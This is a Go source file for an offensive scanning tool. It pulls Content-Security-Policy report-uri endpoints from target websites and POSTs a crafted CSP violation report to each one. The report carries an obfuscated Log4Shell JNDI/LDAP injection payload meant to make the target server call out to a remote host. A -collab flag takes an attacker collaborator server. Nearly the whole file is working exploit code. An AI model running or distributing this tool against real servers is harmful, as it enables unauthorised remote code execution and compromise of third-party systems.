package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"strings"
	"time"
)

func main() {
	// Define input and interact flags
	var input string
	var collab string
	flag.StringVar(&input, "input", "", "a URL or file to grab data from")
	flag.StringVar(&collab, "collab", "", "collab server")

	// Parse the flags
	flag.Parse()

	// Check if the input flag is set
	if input == "" {
		fmt.Println("Please provide a URL or file using the -input flag")
		return
	}

	if collab == "" {
		fmt.Println("Please provide a URL for collaborator server using the -collab flag")
		return
	}

	// Check if the input is a file
	if _, err := os.Stat(input); err == nil {
		// Open the file
		f, err := os.Open(input)
		if err != nil {
			fmt.Println(err)
			return
		}
		defer f.Close()

		// Read the file line by line
		scanner := bufio.NewScanner(f)
		for scanner.Scan() {
			// Set the URL variable as the scanned line
			urlz := scanner.Text()

			// Send the URL to the grabber function
			if strings.Contains(urlz, "google") {
			} else {
				grabber(urlz, collab)
			}
		}
		if err := scanner.Err(); err != nil {
			fmt.Println(err)
		}
	} else {
		// Set the URL variable as the input argument
		urlz := input

		// Send the URL to the grabber function
		if strings.Contains(urlz, "google") {
		} else {
			grabber(urlz, collab)
		}
	}

}

func grabber(url2, collab string) {

	u, err := url.Parse(url2)
	if err != nil {
		fmt.Println(err)
		return
	}
	// Create a context with a 10-second timeout
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	req, err := http.NewRequest("GET", u.String(), nil)
	req = req.WithContext(ctx)
	if err != nil {
		fmt.Println(err)
		return

	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return

	}
	defer resp.Body.Close()

	// Get the Content-Security-Policy-Report-Only header, if present
	headerValue := resp.Header.Get("Content-Security-Policy-Report-Only")

	// If the header is not present, get the Content-Security-Policy header
	if headerValue == "" {
		headerValue = resp.Header.Get("Content-Security-Policy")
	}

	var reportURI string

	parts := strings.Split(headerValue, ";")
	for _, part := range parts {
		kv := strings.SplitN(strings.TrimSpace(part), " ", 2)
		if len(kv) != 2 {
			continue
		}

		if kv[0] == "report-uri" {
			reportURI = kv[1]
		}
	}

	if reportURI != "" {
		reportURL, err := url.Parse(reportURI)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}

		if !reportURL.IsAbs() {
			reportURL = u.ResolveReference(reportURL)
		}
		reportURLString := reportURL.String()
		if strings.Contains(reportURLString, "report-uri") || strings.Contains(reportURLString, "withgoogle") || strings.Contains(reportURLString, "facebook") {
			fmt.Println("Sorry a known not vulnable host was found and will not be attacked.")
		} else {
			fmt.Println(reportURL)
			if reportURI != "" {
				// Open the file in append mode
				f, err := os.OpenFile("csp-found.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if err != nil {
					fmt.Println(err)
					return
				}
				defer f.Close()

				// Write the string to the file with a new line after it
				_, err = fmt.Fprintln(f, reportURL)
				if err != nil {
					fmt.Println(err)
					return
				}

				fmt.Println("Successfully wrote string to file")
				log4j(collab)
			} else {
				fmt.Println("reportURI string is empty")
			}
		}
	}
}

func log4j(collab string) {
	// Open the file
	file, err := os.Open("csp-found.txt")
	if err != nil {
		fmt.Println(err)
		return
	}
	defer file.Close()

	// Create a scanner to read the file
	scanner := bufio.NewScanner(file)

	// Set the variable to hold the last line
	var lastLine string

	// Iterate through the file and set lastLine to the last line
	for scanner.Scan() {
		lastLine = scanner.Text()
	}

	//grab-subdomain
	subs, err := url.Parse(lastLine)
	if err != nil {
		log.Fatal(err)
	}

	//grab subdomain to put in log4j payload
	hostname := fmt.Sprintf("%s", subs.Hostname())

	// Create HTTP and ignore bad ssl
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	//CSP payload
	payload := fmt.Sprintf(`{"csp-report":{"blocked-uri":"inline","column-number":206,"disposition":"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s/test}","document-uri":"%s","effective-directive":"script-src-elem","line-number":59,"original-policy":"connect-src * https://*.tiles.mapbox.com https://api.mapbox.com; default-src blob:; font-src * data:; frame-src * data: tableau-desktop:; img-src * data: blob:; object-src data:; report-uri %s; script-src * blob:; style-src * 'unsafe-inline'","referrer":"","source-file":"moz-extension","status-code":200,"violated-directive":"script-src-elem"}}`, hostname, lastLine, lastLine)
	// Create the POST request
	req, err := http.NewRequest("POST", lastLine, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	req.Header.Set("Content-Type", "application/csp-report")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Origin", lastLine)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer resp.Body.Close()

	dump, err := httputil.DumpResponse(resp, true)
	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println(string(dump))
}
